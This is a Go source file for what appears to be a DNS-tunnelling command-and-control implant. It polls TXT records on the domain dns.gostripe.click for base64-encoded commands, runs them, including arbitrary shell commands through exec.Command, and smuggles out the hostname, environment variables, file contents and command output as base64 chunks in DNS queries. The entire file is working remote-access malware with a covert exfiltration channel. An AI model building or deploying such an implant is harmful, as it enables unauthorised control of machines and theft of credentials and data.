package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/djherbis/atime"
	ps "github.com/mitchellh/go-ps"
)

var history []string

var dnsserver = "127.0.0.1"
var dnsport = "8888"
var dnsfull = dnsserver + ":" + dnsport
var cmdurl = "cmd.dns.gostripe.click"
var baseurl = "dns.gostripe.click"

var curcmd string
var sessionID string

type FileBrowser struct {
	Files        []FileData     `json:"files"`
	IsFile       bool           `json:"is_file"`
	Permissions  PermissionJSON `json:"permissions"`
	Filename     string         `json:"name"`
	ParentPath   string         `json:"parent_path"`
	Success      bool           `json:"success"`
	FileSize     int64          `json:"size"`
	LastModified string         `json:"modify_time"`
	LastAccess   string         `json:"access_time"`
}

type PermissionJSON struct {
	Permissions FilePermission `json:"permissions"`
}

type FileData struct {
	IsFile       bool           `json:"is_file"`
	Permissions  PermissionJSON `json:"permissions"`
	Name         string         `json:"name"`
	FullName     string         `json:"full_name"`
	FileSize     int64          `json:"size"`
	LastModified string         `json:"modify_time"`
	LastAccess   string         `json:"access_time"`
}

type FilePermission struct {
	UID         int    `json:"uid"`
	GID         int    `json:"gid"`
	Permissions string `json:"permissions"`
	User        string `json:"user,omitempty"`
	Group       string `json:"group,omitempty"`
}

const (
	layoutStr = "01/02/2006 15:04:05"
)

func main() {
	rand.Seed(time.Now().UnixNano())

	sessionID = randSeq(5)
	//sessionID = base64Encode(sessionID)

	curcmd = randSeq(20)
	for {
		sendARecordCurcmd(curcmd)
		sendARecordHostname()
		time.Sleep(1 * time.Second)
		cmds := getTXTrecord()
		for _, c := range cmds {
			chash := strings.Split(c, ":")
			// Check if we are recieiving the wright format
			if len(chash) == 2 {
				check := commandRan(chash[1])
				if !check {
					runCommand(base64Decode(chash[0]), chash[1])
					history = append(history, chash[1])
					curcmd = randSeq(20)
				}
			}

		}
		history = nil

	}

}

func workingDir() string {
	path, _ := os.Getwd()
	return path
}

func runCommand(commandStr string, cmdid string) error {
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	if len(arrCommandStr) < 1 {
		return errors.New("")
	}
	switch arrCommandStr[0] {
	case "ps":
		msgid := randSeq(10)
		processList, _ := ps.Processes()
		// map ages
		for x := range processList {
			var process ps.Process
			process = processList[x]
			data := fmt.Sprintf("%d\t%s\n", process.Pid(), process.Executable())

			for _, chunk := range split(data, 30) {
				sendARecord(chunk, msgid)
			}

			// do os.* stuff on the pid
		}
		sendARecordWD(workingDir())
	case "env":
		data := strings.Join(os.Environ(), "\n")
		msgid := randSeq(10)
		for _, chunk := range split(data, 30) {
			sendARecord(chunk, msgid)
		}
		sendARecordWD(workingDir())
	case "whoami":
		data, _ := user.Current()
		msgid := randSeq(10)
		for _, chunk := range split(data.Username, 30) {
			sendARecord(chunk, msgid)
		}
		sendARecordWD(workingDir())
	case "pwd":
		data, _ := os.Getwd()
		msgid := randSeq(10)
		for _, chunk := range split(data, 30) {
			sendARecord(chunk, msgid)
		}
		sendARecordWD(workingDir())
	case "ls":
		var path string
		if len(arrCommandStr) == 1 {
			path = "./"
		} else {
			path = arrCommandStr[1]
		}
		list := list(path)
		data := strings.Join(list, "\n")
		msgid := randSeq(10)
		for _, chunk := range split(data, 30) {
			sendARecord(chunk, msgid)
		}
		sendARecordWD(workingDir())
	case "cat":
		data := cat(arrCommandStr[1])
		msgid := randSeq(10)
		for _, chunk := range split(data, 30) {
			sendARecord(chunk, msgid)
		}
		sendARecordWD(workingDir())
	case "cd":
		if len(arrCommandStr) > 1 {
			os.Chdir(arrCommandStr[1])
			sendARecordWD(workingDir())
		}
		return nil
	case "kill":
		os.Exit(0)
	default:
		fmt.Println("Not OPSEC safe...")
		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		err := cmd.Run()
		if err != nil {
			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
			return nil
		}
		sendARecordWD(workingDir())

		msgid := randSeq(15)
		for _, chunk := range split(out.String(), 30) {

			fmt.Println(chunk)
			sendARecord(chunk, msgid)
		}
		return nil
	}
	return nil
}

func sendARecordWD(rec string) {
	encoded := base64.StdEncoding.EncodeToString([]byte(rec))
	encoded = strings.Replace(encoded, "=", "", -1)

	msg := encoded + ".working." + sessionID + "." + baseurl
	fmt.Println(msg)

	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(20000),
			}
			return d.DialContext(ctx, network, dnsfull)
		},
	}
	r.LookupHost(context.Background(), msg)
}

func sendARecordCurcmd(rec string) {
	msg := rec + ".current." + sessionID + "." + baseurl
	fmt.Println(msg)

	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(20000),
			}
			return d.DialContext(ctx, network, dnsfull)
		},
	}
	r.LookupHost(context.Background(), msg)
}

func sendARecordHostname() {
	name, _ := os.Hostname()
	msg := base64Encode(name) + ".host." + sessionID + "." + baseurl
	fmt.Println(msg)

	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(20000),
			}
			return d.DialContext(ctx, network, dnsfull)
		},
	}
	r.LookupHost(context.Background(), msg)
}

func sendARecord(rec string, msgid string) {
	encoded := base64.StdEncoding.EncodeToString([]byte(rec))
	encoded = strings.Replace(encoded, "=", "", -1)

	msg := encoded + "." + msgid + "." + sessionID + "." + baseurl

	fmt.Println(msg)

	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(20000),
			}
			return d.DialContext(ctx, network, dnsfull)
		},
	}
	r.LookupHost(context.Background(), msg)
}

func getArecord() {
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}
			return d.DialContext(ctx, network, dnsfull)
		},
	}
	iprecords, _ := r.LookupHost(context.Background(), curcmd+"."+sessionID+"."+cmdurl)
	for _, ip := range iprecords {
		fmt.Println(ip)
	}
}

func getTXTrecord() []string {
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}
			return d.DialContext(ctx, network, dnsfull)
		},
	}

	txtrecords, _ := r.LookupTXT(context.Background(), curcmd+"."+sessionID+"."+cmdurl)

	for _, txt := range txtrecords {
		fmt.Println(txt)
	}
	return txtrecords
}

func base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func base64Decode(str string) string {
	data, _ := base64.StdEncoding.DecodeString(str)
	return string(data)
}

func commandAdd(cmd string) {

	history = append(history, cmd)
}

func commandRan(cmd string) bool {

	return contains(history, cmd)
}

func contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}

func split(s string, size int) []string {
	ss := make([]string, 0, len(s)/size+1)
	for len(s) > 0 {
		if len(s) < size {
			size = len(s)
		}
		ss, s = append(ss, s[:size]), s[size:]

	}
	return ss
}

var letters = []rune("123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func cat(filename string) string {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("File reading error", err)
		return "Error reading file " + filename
	}
	fmt.Println("Contents of file:", string(data))
	return string(data)
}

func exists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}

func list(path string) []string {
	checkPath, _ := exists(path)
	if checkPath {
		data := []string{}
		//var users []string

		var e FileBrowser
		abspath, _ := filepath.Abs(path)
		dirInfo, err := os.Stat(abspath)
		if err != nil {
			fmt.Println("Error")
		}
		e.IsFile = !dirInfo.IsDir()

		//p := FilePermission{}
		e.Permissions.Permissions = GetPermission(dirInfo)
		e.Filename = dirInfo.Name()
		e.ParentPath = filepath.Dir(abspath)
		if strings.Compare(e.ParentPath, e.Filename) == 0 {
			e.ParentPath = ""
		}
		e.FileSize = dirInfo.Size()
		e.LastModified = dirInfo.ModTime().Format(layoutStr)
		at, err := atime.Stat(abspath)
		if err != nil {
			e.LastAccess = ""
		} else {
			e.LastAccess = at.Format(layoutStr)
		}
		e.Success = true

		if dirInfo.IsDir() {
			files, err := ioutil.ReadDir(abspath)
			if err != nil {
				fmt.Println("Error")
			}

			fileEntries := make([]FileData, len(files))
			for i := 0; i < len(files); i++ {
				fileEntries[i].IsFile = !files[i].IsDir()
				fileEntries[i].Permissions.Permissions = GetPermission(files[i])
				fileEntries[i].Name = files[i].Name()
				fileEntries[i].FullName = filepath.Join(abspath, files[i].Name())
				fileEntries[i].FileSize = files[i].Size()
				fileEntries[i].LastModified = files[i].ModTime().Format(layoutStr)
				at, err := atime.Stat(abspath)
				if err != nil {
					fileEntries[i].LastAccess = ""
				} else {
					fileEntries[i].LastAccess = at.Format(layoutStr)
				}
			}
			e.Files = fileEntries
		}
		for _, f := range e.Files {
			line := fmt.Sprintf("%s %s %s %s %s %s", f.FullName, f.LastAccess, f.LastModified, f.Permissions.Permissions.User, f.Permissions.Permissions.Group, f.Permissions.Permissions.Permissions)
			data = append(data, line)
		}
		//header := []string{"File", "LastAccess", "LastModified", "User", "Group", "Permissions"}
		//tables.TableData(data, header)
		return data
	}
	return nil
}

func GetPermission(finfo os.FileInfo) FilePermission {
	perms := FilePermission{}
	perms.Permissions = finfo.Mode().Perm().String()
	systat := finfo.Sys().(*syscall.Stat_t)
	if systat != nil {
		perms.UID = int(systat.Uid)
		perms.GID = int(systat.Gid)
		tmpUser, err := user.LookupId(strconv.Itoa(perms.UID))
		if err == nil {
			perms.User = tmpUser.Username
		}
		tmpGroup, err := user.LookupGroupId(strconv.Itoa(perms.GID))
		if err == nil {
			perms.Group = tmpGroup.Name
		}
	}
	return perms
}
